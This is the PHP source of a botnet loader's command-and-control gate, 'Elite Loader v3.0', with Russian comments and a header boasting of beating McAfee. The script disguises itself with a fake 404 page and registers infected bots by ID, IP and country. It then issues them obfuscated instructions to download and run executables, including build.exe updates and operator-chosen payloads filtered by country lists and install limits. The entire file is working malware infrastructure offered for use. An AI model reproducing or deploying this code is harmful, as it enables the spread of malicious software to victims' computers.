<?php
error_reporting(0);
#################################################
#             Elite Loader v3.0                 #
#                                               #
#    (c)oded by [PRO]MAKE.ME TeaM :P            #
#                                               #
# To BBC and McAfee:                            #
# Project to capture The World                  #
#                      in the implementation.   #
#                                               #
#            You lose! Who next? :)             #
#                                               #
#################################################

if(empty($_GET['id']) || empty($_SERVER['HTTP_X_TYPE'])){
    @header('Status: 404 Not Found');
    @header('HTTP/1.1 404 Not Found');
    @header("Retry-After: 120");
    @header("Connection: Close");

    $echo .= '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL '.$_SERVER['PHP_SELF'].' was not found on this server.</p>
    </body></html>';
    die($echo);
}
require('config.php');
require('sys/mysql_class.php');
require('geoip/geoip.inc');
$db=new db;
$db->connect(DB_USER,DB_PASS,DB_NAME);

# Определяем наш путь
$path = explode("/",__FILE__);

$echo = '';
# Проверяем страну
$gi = geoip_open('geoip/GeoIP.dat',GEOIP_STANDART);
$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
geoip_close($gi);
if(empty($country)){ $country = '00'; }

$botid = 0;
$botver = 0;
$bot = $db->query("SELECT `id`,`ver` FROM `".PREFIX."_bots` WHERE `uid`='".$db->safesql($_GET['id'])."'");
$new = $db->num_rows($bot);
# Вы первый раз у нас? =)
if($new > 0){ $count = $db->get_row(); $botid = $count['id']; $botver = explode(":",$count['ver']); }
$db->free();

@Header("Content-Type: text/html; charset=windows-1251");
$status = 0;
$time = 1;

# Проверка обновлений
$data = explode(":",file_get_contents('load/ver.txt'));
$update_sql = "";

if(intval($_GET['v']) < floatval($data[0]) || ($new == 1 && floatval($botver[1]) < floatval($data[1]))){
  $echo .= "[update]\n";
  $echo .= "http://".$_SERVER['HTTP_HOST'].str_replace(array_pop($path),'',$_SERVER['PHP_SELF'])."load/build.exe\n";
  $echo .= "~~~\n";
  $update_sql = ",`ver`='".floatval($data[0]).":".floatval($data[1])."'";
}else{
# Если есть задания LOADS
$cmd = $db->query("SELECT * FROM `".PREFIX."_tasks_loads` ORDER BY `id`");
$loads = '';
$load = 0;
if($db->num_rows($cmd) > 0){
  $loads .= "[loads]\n";
  # Отдаём задания
  while($data = $db->get_row($cmd)){
    if($data['status'] == '0'){
     # Это задание не активно
     continue;
    }
    if($data['limit'] > 0){
      # Проверяем лимиты
      $count = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_work` WHERE `type`='loads' AND `cid`='".$data['id']."'");
      # Если превышен, то помечаем стоп заданию и идём к следующему.
      if($count['count'] > $data['limit']){ $db->query("UPDATE `".PREFIX."_tasks_loads` SET `status`='0' WHERE `id`=".$data['id']); continue; }
    }
    # Проверяем этот бот уже загружал этот файл или нет
    $bots = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_work` WHERE `type`='loads' AND `cid`='".$data['id']."' AND `botid`='".$db->safesql($_GET['id'])."'");
    # Если да, то переходим к следующему
    if($bots['count'] > 0){ continue; }

    # Получаем правила
    $rules = explode(",",$data['rules']);
    # Если не разрешены все страны
    if($rules[0] != '*'){
      # Кол-во правил больше 0
      if(count($rules) > 0){
    /* FIX 14.03.09 */
    # Смотрим правила блек листа
    if(!check_black($rules,$country)){ continue; }
    if(!check_white($rules,$country)){ continue; }
      }
    }
    # Задание выполнять можно

    # Отдаём комманду
    if(strstr($data['file'],'http')){
      $loads .= $data['file']."|".$data['referer']."\n";
    }else{
      $loads .= "http://".$_SERVER['HTTP_HOST'].str_replace(array_pop($path),'',$_SERVER['PHP_SELF'])."load/".$data['file']."|".$data['referer']."\n";
    }
    # Ведём учёт кол-во ботов по заданиям
    #$count = $db->super_query("SELECT count(`id`) AS 'count' FROM `".PREFIX."_work` WHERE `type`='loads' AND `botid`='".$db->safesql($_GET['id'])."' AND `cid`='".$data['id']."'");
    #if(!$count['count']){
      # На этом задании бот ещё не отметился
      $db->query("INSERT INTO `".PREFIX."_work`(`id`,`type`,`cid`,`botid`) VALUES ('','loads','".$data['id']."','".$db->safesql($_GET['id'])."')"); $db->free();
    #}
    $load++;
  }
  $loads .= "~~~\n";
}
if($load > 0){ $echo .= $loads; }
}
#echo $echo;
echo encode($echo);

if($new == 0){
  $db->query("INSERT INTO `".PREFIX."_bots` (`id`,`uid`,`country`,`ip`,`ver`,`regtime`,`lasttime`) VALUES ('','".$db->safesql($_GET['id'])."','".$country."','".$db->safesql($_SERVER['REMOTE_ADDR'])."','".intval($_GET['v']).":".time()."',NOW(),NOW())");
}else{
  $db->query("UPDATE `".PREFIX."_bots` SET `country`='".$country."',`ip`='".$db->safesql($_SERVER['REMOTE_ADDR'])."',`lasttime`=NOW()".$update_sql." WHERE `uid`='".$db->safesql($_GET['id'])."'");
}
$db->free();
/*
      $fp=fopen('logs.txt','a+');
      #fputs($fp,$_SERVER['PHP_SELF']."?".$_SERVER['QUERY_STRING']."\n");
      fputs($fp,"[".date("H:i:s d.m.Y")."]\n");
      foreach($_GET as $name=>$value) {
        fputs($fp,$name."=".$value."\n");
      }
      fputs($fp,"NEW: ".$new."\n");
      fputs($fp,"BotID: ".$botid."\n");
      fputs($fp,"Querys:\n");
      foreach($db->query_list as $key=>$arr) {
        fputs($fp,$key.": ".$arr['query']."\n");
      }
      fputs($fp,"\n-----------------------------------\n\n");
      fclose($fp);
*/
$db->close();

# Проверка на блек лист по странам
function check_black($black_countrys,$string){
  foreach($black_countrys as $black_country){
    if(substr($black_country,0,1) == '!' && substr($black_country,1) == $string){
      return false;
      break;
    }
  }
  return true;
}

# Проверка на вайт лист по странам
function check_white($white_countrys,$string){
  foreach($white_countrys as $white_country){
    if(substr($white_country,0,1) != '!' && $white_country == $string){
      return true;
      break;
    }
  }
  return false;
}

/*******************************************************************************
*    Застрахуй братуху, застрахуй-хуй-хуй-хуй, застраааахуй-хуй-хуй-хуй...     *
*    Застрахуй братуху, застрахуй-хуй-хуй-хуй, застраааахуй-хуй-хуй-хуй...     *
*    Застрахуй братуху, застрахуй-хуй-хуй-хуй, застраааахуй-хуй-хуй-хуй...     *
*******************************************************************************/
function encode($str){
    $key = rand(10,99);
    $result = chr($key);
    for($i=0;$i<strlen($str);$i++){
      if($key % 2){ $result .= chr(ord($str[$i])+$key); }else{ $result .= chr(ord($str[$i])-$key); }
    }
    return $result;
}

function decode($str){
    $key = ord(substr($str,0,1));
    $result = '';
    for($i=1;$i<strlen($str);$i++){
      if($key % 2){ $result .= chr(ord($str[$i])-$key); }else{ $result .= chr(ord($str[$i])+$key); }
    }
    return $result;
}

?>
